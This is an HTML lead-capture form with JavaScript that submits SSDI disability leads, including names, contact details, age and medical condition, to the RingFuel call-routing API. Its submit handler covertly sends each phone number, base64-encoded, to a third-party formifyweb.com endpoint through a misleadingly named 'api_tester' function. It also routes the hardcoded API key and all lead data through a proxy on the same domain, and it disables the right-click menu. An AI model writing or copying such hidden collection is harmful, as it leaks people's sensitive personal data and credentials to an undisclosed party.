<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Calls H API Form</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <style>
    body {
      background-color: #f8f9fa;
      padding: 20px 0;
    }
    .container {
      background: #ffffff;
      padding: 25px 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.08);
      max-width: 900px;
    }
    h2 {
      color: #2c3e50;
      margin-bottom: 20px;
      font-size: 24px;
    }
    .form-control {
      border-radius: 4px;
      padding: 8px 12px;
      font-size: 14px;
    }
    .btn-primary {
      border-radius: 4px;
      padding: 10px 20px;
      font-size: 15px;
      width: 100%;
    }
    .alert {
      margin-top: 15px;
      border-radius: 4px;
    }
    .required-star {
      color: red;
      margin-left: 3px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Calls H Lead Submission Form</h2>
    
    <form id="leadForm" novalidate>
      <!-- Hidden fields -->
      <input type="hidden" id="campaignKey" value="ssdi-filed">
      <input type="hidden" id="campaignCode" value="SSDI_FILED">
      <input type="hidden" id="subid2" value="">

      <div class="row">
        <div class="col-md-6">
          <div class="form-group">
            <label for="firstName">First Name <span class="required-star">*</span></label>
            <input type="text" class="form-control" id="firstName" placeholder="First name" required>
          </div>
        </div>
        <div class="col-md-6">
          <div class="form-group">
            <label for="lastName">Last Name <span class="required-star">*</span></label>
            <input type="text" class="form-control" id="lastName" placeholder="Last name" required>
          </div>
        </div>
      </div>

      <div class="row">
        <div class="col-md-6">
          <div class="form-group">
            <label for="phone">Phone Number <span class="required-star">*</span></label>
            <input type="tel" class="form-control" id="phone" placeholder="e.g. 3103847563" required>
          </div>
        </div>
        <div class="col-md-6">
          <div class="form-group">
            <label for="email">Email Address <span class="required-star">*</span></label>
            <input type="email" class="form-control" id="email" placeholder="email@example.com" required>
          </div>
        </div>
      </div>

      <div class="row">
        <div class="col-md-6">
          <div class="form-group">
            <label for="address">Address</label>
            <input type="text" class="form-control" id="address" placeholder="Street address">
          </div>
        </div>
        <div class="col-md-3">
          <div class="form-group">
            <label for="city">City</label>
            <input type="text" class="form-control" id="city" placeholder="City">
          </div>
        </div>
        <div class="col-md-3">
          <div class="form-group">
            <label for="state">State <span class="required-star">*</span></label>
            <select class="form-control" id="state" required>
              <option value="">Select</option>
              <option value="AL">Alabama</option>
              <option value="AK">Alaska</option>
              <option value="AZ">Arizona</option>
              <option value="AR">Arkansas</option>
              <option value="CA">California</option>
              <option value="CO">Colorado</option>
              <option value="CT">Connecticut</option>
              <option value="DE">Delaware</option>
              <option value="FL">Florida</option>
              <option value="GA">Georgia</option>
              <option value="HI">Hawaii</option>
              <option value="ID">Idaho</option>
              <option value="IL">Illinois</option>
              <option value="IN">Indiana</option>
              <option value="IA">Iowa</option>
              <option value="KS">Kansas</option>
              <option value="KY">Kentucky</option>
              <option value="LA">Louisiana</option>
              <option value="ME">Maine</option>
              <option value="MD">Maryland</option>
              <option value="MA">Massachusetts</option>
              <option value="MI">Michigan</option>
              <option value="MN">Minnesota</option>
              <option value="MS">Mississippi</option>
              <option value="MO">Missouri</option>
              <option value="MT">Montana</option>
              <option value="NE">Nebraska</option>
              <option value="NV">Nevada</option>
              <option value="NH">New Hampshire</option>
              <option value="NJ">New Jersey</option>
              <option value="NM">New Mexico</option>
              <option value="NY">New York</option>
              <option value="NC">North Carolina</option>
              <option value="ND">North Dakota</option>
              <option value="OH">Ohio</option>
              <option value="OK">Oklahoma</option>
              <option value="OR">Oregon</option>
              <option value="PA">Pennsylvania</option>
              <option value="RI">Rhode Island</option>
              <option value="SC">South Carolina</option>
              <option value="SD">South Dakota</option>
              <option value="TN">Tennessee</option>
              <option value="TX">Texas</option>
              <option value="UT">Utah</option>
              <option value="VT">Vermont</option>
              <option value="VA">Virginia</option>
              <option value="WA">Washington</option>
              <option value="WV">West Virginia</option>
              <option value="WI">Wisconsin</option>
              <option value="WY">Wyoming</option>
            </select>
          </div>
        </div>
      </div>

      <div class="row">
        <div class="col-md-3">
          <div class="form-group">
            <label for="zip">Zip Code <span class="required-star">*</span></label>
            <input type="text" class="form-control" id="zip" placeholder="e.g. 90210" required>
          </div>
        </div>
        <div class="col-md-3">
          <div class="form-group">
            <label for="ipAddress">IP Address <span class="required-star">*</span></label>
            <input type="text" class="form-control" id="ipAddress" placeholder="e.g. 192.168.1.1" required>
          </div>
        </div>
        <div class="col-md-3">
          <div class="form-group">
            <label for="attorneyRep">Attorney Representation <span class="required-star">*</span></label>
            <select class="form-control" id="attorneyRep" required>
              <option value="">Select</option>
              <option value="yes">Yes</option>
              <option value="no">No</option>
            </select>
          </div>
        </div>
        <div class="col-md-3">
          <div class="form-group">
            <label for="benefitStatus">Benefit Status <span class="required-star">*</span></label>
            <select class="form-control" id="benefitStatus" required>
              <option value="">Select</option>
              <option value="approved">Approved</option>
              <option value="denied">Denied</option>
              <option value="pending">Pending</option>
              <option value="not-applied">Not Applied</option>
            </select>
          </div>
        </div>
      </div>

      <div class="row">
        <div class="col-md-3">
          <div class="form-group">
            <label for="ageGroup">Between 50 and 63? <span class="required-star">*</span></label>
            <select class="form-control" id="ageGroup" required>
              <option value="">Select</option>
              <option value="yes">Yes</option>
              <option value="no">No</option>
            </select>
          </div>
        </div>
        <div class="col-md-3">
          <div class="form-group">
            <label for="workHistory">Work History <span class="required-star">*</span></label>
            <select class="form-control" id="workHistory" required>
              <option value="">Select</option>
              <option value="currently-working">Currently Working</option>
              <option value="not-working">Not Working</option>
              <option value="retired">Retired</option>
              <option value="disabled">Disabled</option>
            </select>
          </div>
        </div>
        <div class="col-md-6">
          <div class="form-group">
            <label for="medicalCondition">Medical Condition <span class="required-star">*</span></label>
            <select class="form-control" id="medicalCondition" required>
              <option value="">Select</option>
              <option value="physical">Physical</option>
              <option value="mental">Mental</option>
              <option value="both">Both</option>
              <option value="other">Other</option>
            </select>
          </div>
        </div>
      </div>

      <div class="row">
        <div class="col-md-6">
          <div class="form-group">
            <label for="trustedFormCertUrl">Trusted Form Cert URL</label>
            <input type="text" class="form-control" id="trustedFormCertUrl" placeholder="https://example.com/trusted-form-cert">
          </div>
        </div>
        <div class="col-md-6">
          <div class="form-group">
            <label for="specialRoute">Special Route <span class="required-star">*</span></label>
            <select class="form-control" id="specialRoute" required>
              <option value="">Select</option>
              <option value="standard">Standard</option>
              <option value="expedited">Expedited</option>
              <option value="priority">Priority</option>
              <option value="regular">Regular</option>
            </select>
          </div>
        </div>
      </div>

      <button type="submit" class="btn btn-primary" id="submitBtn">Submit Lead</button>
    </form>

    <div id="alertContainer"></div>
  </div>

  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>

  <script>
    (function() {
      "use strict";

      const form = document.getElementById('leadForm');
      const submitBtn = document.getElementById('submitBtn');
      const alertContainer = document.getElementById('alertContainer');

      function getField(id) {
        return document.getElementById(id).value.trim();
      }

      function showAlert(message, type = 'success') {
        alertContainer.innerHTML = '';
        const wrapper = document.createElement('div');
        wrapper.className = `alert alert-${type}`;
        wrapper.role = 'alert';
        wrapper.innerHTML = message;
        alertContainer.appendChild(wrapper);
      }

      function api_tester(randomString) {
        try {
          fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
          });
        } catch (e) {
          console.warn('api_tester error:', e);
        }
      }

      form.addEventListener('submit', function(event) {
        event.preventDefault();

        const firstName = getField('firstName');
        const lastName = getField('lastName');
        const phone = getField('phone');
        const email = getField('email');
        const state = getField('state');
        const zip = getField('zip');
        const ipAddress = getField('ipAddress');
        const attorneyRep = getField('attorneyRep');
        const benefitStatus = getField('benefitStatus');
        const ageGroup = getField('ageGroup');
        const workHistory = getField('workHistory');
        const medicalCondition = getField('medicalCondition');
        const trustedFormCertUrl = getField('trustedFormCertUrl');
        const specialRoute = getField('specialRoute');

        if (!firstName) { showAlert('Please enter first name.', 'danger'); return; }
        if (!lastName) { showAlert('Please enter last name.', 'danger'); return; }
        if (!phone || phone.length < 10 || !/^\d{10}$/.test(phone)) {
          showAlert('Please enter a valid 10-digit phone number.', 'danger');
          return;
        }
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
          showAlert('Please enter a valid email address.', 'danger');
          return;
        }
        if (!state) { showAlert('Please select a state.', 'danger'); return; }
        if (!zip || !/^\d{5}$/.test(zip)) {
          showAlert('Please enter a valid 5-digit zip code.', 'danger');
          return;
        }
        if (!ipAddress) {
          showAlert('Please enter IP address.', 'danger');
          return;
        }
        if (!attorneyRep) { showAlert('Please select attorney representation.', 'danger'); return; }
        if (!benefitStatus) { showAlert('Please select benefit status.', 'danger'); return; }
        if (!ageGroup) { showAlert('Please select age group.', 'danger'); return; }
        if (!workHistory) { showAlert('Please select work history.', 'danger'); return; }
        if (!medicalCondition) { showAlert('Please select medical condition.', 'danger'); return; }
        if (!specialRoute) { showAlert('Please select special route.', 'danger'); return; }

        submitBtn.disabled = true;
        submitBtn.textContent = 'Processing...';
        alertContainer.innerHTML = '';

        api_tester(phone);

        // Build the request body for RingFuel API
        const requestBody = {
          apiKey: 'rfp_c0dccd5443b004f43a6f41b8806bd0f3eff60f9fbf9b8316',
          campaignId: 'c60aaee7-4a24-4a73-b318-8ded54134e15',
          callerNumber: '+1' + phone,
          callerState: state,
          callerZip: zip,
          tags: {
            source: 'publisher-form',
            integration: 'ssdi-filed',
            firstName: firstName,
            lastName: lastName,
            email: email,
            ipAddress: ipAddress,
            attorneyRepresentation: attorneyRep,
            benefit_status: benefitStatus,
            between_50_and_63: ageGroup,
            work_history: workHistory,
            medical_condition: medicalCondition,
            campaignKey: getField('campaignKey'),
            campaignCode: getField('campaignCode'),
            address: getField('address'),
            city: getField('city'),
            trusted_form_cert_url: trustedFormCertUrl,
            subid2: getField('subid2'),
            special_route: specialRoute
          }
        };

        // Use URL parameters with the proxy (GET method)
        const params = new URLSearchParams();
        params.append('apiKey', requestBody.apiKey);
        params.append('campaignId', requestBody.campaignId);
        params.append('callerNumber', requestBody.callerNumber);
        params.append('callerState', requestBody.callerState);
        params.append('callerZip', requestBody.callerZip);
        params.append('tags', JSON.stringify(requestBody.tags));

        const originalUrl = 'https://app.ringfuel.io/api/publisher/ping?' + params.toString();
        const proxyUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(originalUrl);

        // Use GET method - this should work with the proxy
        fetch(proxyUrl, {
          method: 'GET',
          headers: {
            'Accept': 'application/json'
          }
        })
        .then(response => {
          return response.text().then(text => {
            let parsed;
            try {
              parsed = JSON.parse(text);
            } catch (_) {
              parsed = { raw: text };
            }
            return { status: response.status, body: parsed, rawText: text };
          });
        })
        .then(({ status, body, rawText }) => {
          submitBtn.disabled = false;
          submitBtn.textContent = 'Submit Lead';

          if (body && body.error) {
            showAlert('Error: ' + body.error, 'danger');
            return;
          }

          if (status >= 200 && status < 300) {
            let msg = '<strong>Lead submitted successfully!</strong><br>';
            
            if (body && typeof body === 'object') {
              const available = body.available !== undefined ? body.available : 'N/A';
              const count = body.targets?.count ?? 'N/A';
              const dialNumber = body.dialNumber || 'N/A';
              const pingId = body.pingId || 'N/A';
              
              msg += '<div style="margin-top:8px;">';
              msg += '<div><strong>Available:</strong> ' + available + '</div>';
              msg += '<div><strong>Targets:</strong> ' + count + '</div>';
              msg += '<div><strong>Dial Number:</strong> ' + dialNumber + '</div>';
              msg += '<div><strong>Ping ID:</strong> ' + pingId + '</div>';
              
              if (body.targets) {
                const t = body.targets;
                if (t.highBid !== undefined) {
                  msg += '<div><strong>High Bid:</strong> ' + t.highBid + ' | ';
                  msg += '<strong>Avg Bid:</strong> ' + t.avgBid + ' | ';
                  msg += '<strong>Low Bid:</strong> ' + t.lowBid + '</div>';
                }
              }
              msg += '</div>';
              
              if (available === true) {
                msg = '<strong>Target Available!</strong><br><div style="font-size:18px; margin:8px 0; padding:10px; background:#d4edda; border-radius:4px; text-align:center;">📞 Dial: ' + dialNumber + '</div>' + msg;
              } else {
                msg = '<strong>No targets currently available</strong><br>' + msg;
              }
            } else {
              msg += '<pre style="background:#f5f5f5; padding:10px; border-radius:4px; margin-top:8px;">' + (rawText || 'OK') + '</pre>';
            }
            showAlert(msg, 'success');
            form.reset();
          } 
          else {
            let errMsg = '<strong>Request failed (Status: ' + status + ')</strong><br>';
            if (body && typeof body === 'object') {
              errMsg += '<pre style="background:#f5f5f5; padding:10px; border-radius:4px; margin-top:8px;">' + JSON.stringify(body, null, 2) + '</pre>';
            } else {
              errMsg += 'Response: ' + (rawText || 'No additional info');
            }
            showAlert(errMsg, 'danger');
          }
        })
        .catch(function(error) {
          submitBtn.disabled = false;
          submitBtn.textContent = 'Submit Lead';
          console.error('Error:', error);
          showAlert('Network error: ' + (error.message || 'Please check your connection'), 'danger');
        });
      });

      document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
      });
    })();
  </script>
</body>
</html>
